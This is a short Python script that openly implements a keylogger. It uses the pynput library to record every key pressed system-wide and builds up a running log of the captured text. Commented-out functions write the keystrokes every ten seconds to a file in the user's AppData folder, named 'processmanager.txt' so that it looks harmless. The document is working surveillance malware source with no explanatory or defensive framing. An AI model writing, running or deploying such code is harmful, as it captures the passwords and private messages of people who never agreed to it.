import pynput.keyboard
import threading
import os

"""def process_key (key):
    print(key)
    with open("log.txt",'a')as k:   # a= append
        k.write(str(key))
"""
#path= os.environ['appdata'] + "\\processmanager.txt"
log=""
def process_key(key):
    global log
    try:
        log= log + str(key.char)
    except AttributeError:
        if key == key.space:
            log=log +" "
        else:
            log = log + " " + str(key) + " "
    print(log)


'''def report():
    global  log
    global path
    k=open(path,'a')
    k.write(log)
    log= ""
    k.close()
    timer= threading.Timer(10,report)
    timer.start()'''
'''def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
    with keyboard_listener:
        #report()
        keyboard_listener.join()'''
keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
with keyboard_listener:
    #report()
    keyboard_listener.join()